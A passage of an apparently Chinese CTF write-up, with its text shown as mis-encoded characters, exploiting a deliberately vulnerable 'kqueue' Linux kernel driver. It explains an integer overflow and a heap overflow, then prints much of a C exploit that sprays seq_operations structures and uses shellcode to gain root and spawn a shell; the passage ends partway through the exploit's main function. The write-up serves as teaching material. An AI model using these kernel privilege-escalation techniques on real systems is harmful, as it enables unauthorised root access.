class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//è¿™é‡Œå¾ªç¯å®Œj=5ï¼Œä¸ä¼šæ‰§è¡Œifè¯­å¥ï¼Œæˆ‘ä»¬èƒ½è¶Šç•Œå¤šåˆ†é…ä¸€ä¸ªé˜Ÿåˆ—</span><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨‹åºç”¨gccå†…ç½®å‡½æ•°<code>__builtin_umulll_overflow</code>æ£€æµ‹ä¹˜æ³•æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ£€æµ‹<code>sizeof(queue_entry)</code>ä¸<code>(request.max_entries+1)</code>ç›¸ä¹˜æ˜¯å¦æº¢å‡º,</p><p>ä½†æ˜¯<code>request.max_entries</code>æœ¬èº«æ²¡æœ‰æº¢å‡ºæ£€æµ‹</p><p>åœ¨request_tç»“æ„çš„å®šä¹‰é‡Œå®ƒæ˜¯32ä½æ— ç¬¦å·æ•´å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<br>  <span class="hljs-type">uint16_t</span> data_size;<br>  <span class="hljs-type">uint16_t</span> entry_idx;<br>  <span class="hljs-type">uint16_t</span> queue_idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure><p><strong>å­˜åœ¨æ•´å‹æº¢å‡ºæ¼æ´</strong>ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæå¤§å€¼<code>0xffffffff</code>ï¼Œé‚£ä¹ˆåŠ 1åå‘ç”Ÿæº¢å‡ºï¼Œå‘ç”Ÿæº¢å‡ºå˜ä¸º0ï¼Œä»è€Œé€šè¿‡äº†ä¹˜æ³•æ£€æµ‹ï¼Œ</p><p>æ‰€ä»¥<code>request.max_entries</code>å¯ä»¥æ˜¯0xffffffffè¿™ä¸ªæå¤§å€¼</p><p>ä¸‹ä¸€ä¸ªæ£€æµ‹<code>__builtin_saddll_overflow</code>å› ä¸ºspace=0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥queue_size=sizeof(queue)</p><p>å€¼å¾—ä¸€é¢˜çš„æ˜¯å› ä¸º<code>request.max_entries+1=0</code>ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰è¿›å…¥å¾ªç¯ï¼Œæ‰€ä»¥æ²¡æœ‰åˆ†é…ä»»ä½•ä¸€ä¸ªqueue_entryæˆå‘˜</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)</span></span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="ä¸‰-save-kqueue-entries">ä¸‰.save_kqueue_entries</h6><p>è¿™é‡Œå­˜åœ¨<strong>å †æº¢å‡ºæ¼æ´</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br><span class="hljs-comment">//å„ç§æ£€æŸ¥</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><span class="hljs-comment">//ä¸ºéœ€è¦ä¿å­˜çš„é˜Ÿåˆ—åˆ†é…å†…å­˜ï¼Œç”±äºæˆ‘ä»¬çš„æ„é€ ï¼Œè¿™é‡Œåªåˆ†é…ç»™new_queueä¸€ä¸ªå°å†…å­˜</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br><span class="hljs-comment">//æ‹·è´åˆ°new_queueå†…å­˜queue-&gt;dataæ•°æ®ï¼Œé•¿åº¦æ˜¯æˆ‘ä»¬å¦å®šçš„request.data_sizeï¼Œæ‰€ä»¥å­˜åœ¨æº¢å‡º</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br><span class="hljs-comment">//å¦‚æœæˆ‘ä»¬æŒ‰å‰é¢0xffffffffè®¾ç½®çš„è¯,æ‹·è´å¾ªç¯æ˜¯æ²¡è¿›å…¥çš„ã€‚è¿™é‡Œçš„ä½œç”¨æ˜¯æ‹·è´kqueue_entry-&gt;dataæ•°æ®ï¼Œé•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬è‡ªå·±å®šçš„request.data_size</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="å››-err">å››.err</h6><p>å‘ƒï¼Œå…¶å®è¿™é‡Œerrå°±printkä¸€ä¸‹ï¼Œæ²¡æœ‰å®è´¨æ€§ä½œç”¨ï¼Œæ‰€ä»¥å…¶å®<strong>æ‰€æœ‰æ£€æµ‹éƒ½æ˜¯æ²¡ç”¨çš„</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>  printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="0x02æ¼æ´åˆ©ç”¨">0x02æ¼æ´åˆ©ç”¨</h4><h5 id="1-æ•´å‹æº¢å‡º">1.æ•´å‹æº¢å‡º</h5><p>å› ä¸º32ä½çš„æ— ç¬¦å·æ•´å‹<code>request.max_entries=0xffffffff+1=0</code>å­˜åœ¨æº¢å‡ºï¼Œæˆ‘ä»¬ä¼ å…¥</p><p><code>0xffffffff</code>ä½¿å…¶åªåˆ†é…ä¸€ä¸ª queue å’Œä¸€ä¸ª data è€Œä¸åˆ†é… queue_entryçš„åŒæ—¶ä½¿å¾—</p><p><code>queue-&gt;max_entries = 0xffffffff</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ queue-&gt;queue_size ä¾¿ä¸º 0x18</p><h5 id="2-å †æº¢å‡º-seq-operationsç»“æ„ä½“">2.å †æº¢å‡º+seq-operationsç»“æ„ä½“</h5><p>å¦‚æœå¡«å…¥0xffffffffçš„è¯åœ¨ save_kqueue_entries()ä¸­ä¼šåˆ†é…0x18å¤§å°çš„objectç»™queue-&gt;queue_sizeï¼Œå†…å­˜ä¼šä»<code>kmalloc-32</code>ä¸­å–ï¼Œé€‰å–ä¸€ä¸ªåŒæ ·ä»kmalloc-32ä¸­åˆ†é…çš„ç»“æ„ä½“ï¼Œå¯ä»¥æ˜¯ <strong>seq-operations</strong>,å½“æˆ‘ä»¬æ‰“å¼€statæ–‡ä»¶ï¼ˆå¯ä»¥ä¸º/proc/self/statï¼‰ä¼šåœ¨å†…æ ¸ç©ºé—´åˆ†é…ä¸€ä¸ª<strong>seq-operations</strong>ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬readè¿™ä¸ªstatæ–‡ä»¶ä¼šè°ƒç”¨proc_ops çš„ <code>proc_read_iter</code> æŒ‡é’ˆï¼Œå…¶é»˜è®¤å€¼ä¸º <code>seq_read_iter()</code> å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨startå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬è¦æ§åˆ¶<strong>seq_operations-&gt;start</strong>æŒ‡å‘æˆ‘ä»¬çš„shllocdeï¼Œåœ¨ç”¨readè¯»å–å¯¹åº”çš„statæ–‡ä»¶è§¦å‘å³å¯</p><h5 id="3-å †å–·å°„">3.å †å–·å°„</h5><p><strong>å †å–·å°„ï¼ˆheap sprayï¼‰</strong>ï¼Œå¤šæ¬¡åˆ†é…ç›¸åŒçš„å†…å­˜ä»¥ç¡®ä¿æˆ‘ä»¬èƒ½å‘½ä¸­å…¶ä¸­ä¹‹ä¸€</p><p>åœ¨è¿™é¢˜ä¸­æˆ‘ä»¬è¦åœ¨å†…æ ¸ç©ºé—´å–·å°„è¶³å¤Ÿå¤šçš„<code>seq_operations</code> ç»“æ„ä½“</p><h5 id="4-ret2usr-ret2shellcode">4.ret2usr+ret2shellcode</h5><p>æ²¡å¼€smep/smap,KPTI,æœ¬é¢˜å¯ä½¿ç”¨ret2usr,<strong>ä½†æ˜¯ç”±äºå¼€å¯äº†kalsrï¼Œæˆ‘ä»¬ä¼¼ä¹å¹¶æ— æ³•æ‰¾åˆ°prepare_kernel_cred å’Œ commit_creds çš„åœ°å€</strong></p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡ç¼–å†™shellcodeåˆ©ç”¨å†…æ ¸æ ˆä¸Šçš„æ•°æ®æ¥è·å¾—å†…æ ¸åŸºå€å»æ‰§è¡Œcommit_creds(prepare_kernel_cred(NULL))ï¼Œç€é™†å›ç”¨æˆ·æ€</p><h4 id="0x03-Exploit">0x03 Exploit</h4><p><strong>åˆ†æä¸€ä¸‹è¿™ä¸ªexpï¼š</strong></p><p>é¦–å…ˆä¿å­˜ä¸€ä¸‹ç”¨æˆ·æ€çš„å¯„å­˜å™¨å€¼ï¼Œä¸ºåç»­è¿”å›ç”¨æˆ·æ€å‡†å¤‡</p><p>æ¥ç€æ‰“å¼€/dev/kqueueè¿™ä¸ªè®¾å¤‡ï¼Œä¸kqueue.koè¿™ä¸ªé©±åŠ¨æ¥äº¤äº’</p><p>create_kqueueæˆ‘ä»¬å®š<code>request.max_entries=0xffffffff</code>ï¼Œå¤§å°å®šä¸º0x20ä¸ªå­˜shellcodeçš„æŒ‡é’ˆ</p><p>edit_kqueueæˆ‘ä»¬å†™å…¥è¿™0x20ä¸ªshellcodeçš„æŒ‡é’ˆ</p><p>æˆ‘ä»¬å †å–·å°„å¤§é‡<code>seq_operations</code> ç»“æ„ä½“ï¼Œè¿™é‡Œopenäº†0x200æ¬¡<code>/proc/self/stat</code>è¿™ä¸ªç»“æ„ä½“</p><p>ç”¨save_kqueueå˜æ›´é•¿åº¦ä»0x18-&gt;0x40,æº¢å‡ºäº†0x28ï¼Œä¹Ÿå°±æ˜¯5ä¸ªshellcodeæŒ‡é’ˆåˆ°äº†å†…å­˜å¤–ï¼Œæˆ‘ä»¬å †å–·åï¼Œå¤§æ¦‚ç‡æ˜¯ä¸º<code>seq_operations</code> ç»“æ„ä½“åˆ†é…çš„å†…å­˜ï¼Œæˆ‘ä»¬è¦†ç›–äº†startæŒ‡é’ˆä¸ºshellcodeçš„æŒ‡é’ˆ</p><p>æˆ‘ä»¬ä¸€æ¬¡ç”¨readæ¥è§¦å‘ï¼Œè°ƒç”¨startæŒ‡é’ˆï¼Œæ‰§è¡Œæˆ‘ä»¬çš„shellcode</p><p><strong>shellcodeåŠŸèƒ½ï¼š</strong></p><p>å–æ ˆä¸Šå­˜çš„å†…æ ¸ç¬¦å·çš„åœ°å€ï¼Œå¾—å‡ºåŸºå€ï¼Œropå‡ºcommit_creds(prepare_kernel_cred(NULL))ï¼Œè¿”å›ç”¨æˆ·æ€ï¼Œç”Ÿæˆshell</p><p>ï¼ˆä¸»è¦æ˜¯å¦‚ä½•è°ƒè¯•å‡ºæ¥è¦å‡çš„å€¼ï¼Œæˆ‘ç°åœ¨è¿˜æ˜¯ä¸ä¼šã€‚ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12 ,[rsp+0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12 ,0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13 ,r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12 ,0x8c580;&quot;</span><br>        <span class="hljs-string">&quot;add r13 ,0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;xor rdi ,rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br><br>    );<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries ,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xDEADC0DE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data =data,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xDAADEEEE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx=queue_idx,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xBADDCAFE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .max_entries=max_entries,<br>        .data_size =data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xB105BABE</span>,&amp;req);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    save_status();<br>    root_rip = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;open /dev/kqueue failed!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span> ;i&lt;<span class="hljs-number">0x20</span>;i++)<br>        data[i]=(<span class="hljs-type">size_t</span>) shellcode ;<br>    <br>    createQueue(<span class="hljs-number">0xffffffff</span>,<span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,data);<br>    <span class="hljs-keyword">for</span>(<span 